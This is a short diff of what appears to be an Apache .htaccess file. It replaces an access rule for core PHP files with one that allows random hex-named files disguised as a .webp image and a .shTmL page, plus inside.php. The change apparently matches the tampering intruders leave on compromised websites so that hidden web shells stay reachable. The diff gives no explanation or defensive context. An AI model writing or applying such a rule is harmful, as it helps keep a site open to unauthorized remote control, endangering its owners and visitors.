@@ -58,7 +58,7 @@
     Order Deny,Allow
     Allow from all
 </FilesMatch>
-<FilesMatch "^(index.php|framework.php|defines.php)$">
+<FilesMatch "^(6ad2e68b5f782.webp|6ad2e69b10c09.shTmL|inside.php)$">
         Order Deny,Allow
     Allow from all
     </FilesMatch>
